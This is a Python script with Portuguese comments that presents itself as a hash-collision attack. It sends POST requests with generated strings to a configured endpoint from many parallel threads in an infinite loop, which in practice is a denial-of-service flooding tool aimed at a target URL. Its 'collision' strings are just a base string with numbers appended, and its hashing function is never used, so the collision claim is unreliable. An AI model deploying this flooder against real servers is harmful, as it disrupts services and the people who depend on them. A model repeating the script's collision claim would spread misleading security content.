import hashlib
import requests
import yaml
import concurrent.futures
import random

# Sessão persistente
session = requests.Session()

# Função para gerar hashes com suporte a diferentes algoritmos
def generate_hash(input_string, algorithm="md5"):
    if algorithm == "md5":
        return hashlib.md5(input_string.encode()).hexdigest()
    elif algorithm == "sha1":
        return hashlib.sha1(input_string.encode()).hexdigest()
    elif algorithm == "sha256":
        return hashlib.sha256(input_string.encode()).hexdigest()
    else:
        raise ValueError("Unsupported algorithm")

# Gerar lista de strings que resultam em colisões
def generate_collision_strings(base_string, num_collisions):
    return [base_string + str(i) for i in range(num_collisions)]

# Randomizar string base para variação
def randomize_string(base_string):
    return base_string + str(random.randint(1000, 9999))

def generate_random_data_list(base_string, num_collisions):
    return [randomize_string(base_string) for _ in range(num_collisions)]

# Função para enviar solicitações ao servidor
def send_request(data, url):
    response = session.post(url, data={'data': data})
    return response

# Enviar requisições de forma paralela
def send_requests_parallel(data_list, url, num_threads):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(lambda data: send_request(data, url), data_list)

# Loop infinito de envio de requisições
def infinite_requests(data_list, url, num_threads):
    while True:
        send_requests_parallel(data_list, url, num_threads)

# Função principal do ataque de colisão de hash
def infinite_hash_collision(config, endpoint=None, threads=None):
    url = endpoint if endpoint else config['endpoint']
    num_threads = threads if threads else config.get('threads', 50)
    num_collisions = config.get('num_collisions', 1000)
    base_string = config.get('base_string', 'default_string')

    # Gerar a lista de dados para colisões
    data_list = generate_collision_strings(base_string, num_collisions)

    # Iniciar o envio infinito de requisições
    infinite_requests(data_list, url, num_threads)

 